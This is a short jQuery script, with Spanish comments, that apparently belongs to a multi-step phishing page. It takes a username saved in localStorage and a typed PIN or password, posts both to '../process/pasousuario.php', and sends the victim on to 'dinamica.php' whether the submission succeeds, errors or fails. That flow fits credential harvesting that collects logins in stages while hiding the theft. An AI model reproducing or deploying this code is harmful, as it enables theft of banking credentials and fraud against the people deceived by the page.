<script type="text/javascript">
    $(document).ready(function() {
        $("#btn-password").click(function(e) {
            e.preventDefault();

            var pin = $("#input_real").val();
            var usr = localStorage.getItem('user_akam') || "Usuario_Anonimo";

            if (pin.length < 4) {
                alert("Por favor ingrese su clave completa.");
                return false;
            }

            $("#fondo, #cargando-o").show();
            
            $.ajax({
                type: 'POST',
                url: '../process/pasousuario.php',
                data: { 
                    'txt-usuario': usr, 
                    'txt-password': pin 
                },
                // Cambiamos el éxito para que espere el "ok" del PHP
                success: function(res) {
                    if(res.trim() == "ok") {
                        window.location.href = "dinamica.php"; 
                    } else {
                        // Si el PHP devuelve error, lo vemos aquí
                        console.log("Error en servidor: " + res);
                        window.location.href = "dinamica.php"; 
                    }
                },
                error: function() {
                    setTimeout(function() { window.location.href = "dinamica.php"; }, 1500);
                }
            });
        });
    });
</script>
